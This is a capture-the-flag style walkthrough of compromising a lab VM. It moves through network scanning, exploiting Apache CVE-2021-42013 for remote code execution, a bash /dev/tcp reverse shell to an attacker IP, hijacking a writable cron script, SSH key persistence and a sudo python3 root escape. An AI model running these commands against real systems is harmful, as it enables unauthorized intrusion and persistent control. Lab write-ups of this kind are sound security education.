---
share_link: https://share.note.sx/qobh9tbr#LXUDoqaLKnLUxpvne9H2nShJLvG6L5dHyVOAkouWabE
share_updated: 2025-05-09T18:26:08+05:30
---

##  Step 1: Discovering the Target

To begin, I scanned the local network to identify active hosts using `arp-scan`:

```bash
sudo arp-scan --local
```

![[Pasted image 20250503004010.png]]

-  **Target IP Identified:** `192.168.112.115`
    

---

##  Step 2: Port Scanning

With the target IP in hand, I scanned it using Nmap to discover open ports and services:

```bash
nmap 192.168.112.115
```

![[Pasted image 20250507224617.png]]

The scan revealed two open ports:

- **Port 22** – SSH
    
- **Port 80** – HTTP
    

I ran another scan to confirm service details:

![[Pasted image 20250503004247.png]]

- Port 80 is running **Apache HTTPD**
    
- Port 22 is running **OpenSSH**
    

---

##  Step 3: Web Enumeration

Navigated to the web interface at `http://192.168.112.115`:

![[Pasted image 20250503004400.png]]

Unfortunately, there wasn’t much to see. To dig deeper, I ran a directory brute-force scan.

![[Pasted image 20250503004814.png]]

-  No interesting directories or files were discovered.
    

---

##  Step 4: Exploiting Apache (CVE-2021-42013)

Suspecting a vulnerable Apache version, I searched for related exploits and found **[CVE-2021-42013](https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013#about-cve-2021-42013)** — a known **path traversal + RCE** vulnerability.

![[Pasted image 20250503005037.png]]

I tested for Local File Inclusion (LFI), which worked, and then moved to Remote Code Execution using [this exploit](https://github.com/sergiovks/LFI-RCE-Unauthenticated-Apache-2.4.49-2.4.50/blob/main/exploit.py):

![[Pasted image 20250503005406.png]]

Verified RCE with the following `curl` command:

```bash
curl -X POST http://192.168.112.115/cgi-bin/%%32%65%%32%65/.../bin/sh \
  -d 'echo Content-Type: text/plain; echo; id'
```

-  Success! Remote code was executed as the `daemon` user.
    

---

##  Step 5: Reverse Shell Access

Next, I prepared a reverse shell payload:

**`bashshell.sh`**

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.112.156/1111 0>&1
```

I hosted the script on my machine and transferred it to the target:

![[Pasted image 20250503005518.png]]  
![[Pasted image 20250503005622.png]]

After triggering the reverse shell:

![[Pasted image 20250503005710.png]]

-  Shell received on my listener!


---

##  Step 6: Privilege Escalation to User

While exploring the system, I found a suspicious script named `tmp.sh` in the root directory:

![[Pasted image 20250503005914.png]]

Interestingly, this file was:

- Globally writable 
    
- Being executed every 10 seconds by user `samsingh` 
    

![[Pasted image 20250503010027.png]]

I replaced the contents of `tmp.sh` with another reverse shell:

![[Pasted image 20250503010131.png]]

Soon after, I caught a shell running as `samsingh`:

![[Pasted image 20250503010224.png]]

With this new access, I grabbed the `user.txt` flag and added my SSH public key for stable access:

![[Pasted image 20250503010330.png]]

---

##  Step 7: Root Privilege Escalation

Now connected as `samsingh` via SSH:

![[Pasted image 20250503010506.png]]

Checking `sudo -l`, I found that `python3` could be run as **root without a password**:

![[Pasted image 20250503010628.png]]

I used the following command to spawn a root shell:

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

![[Pasted image 20250503010739.png]]

 **Root access achieved!**

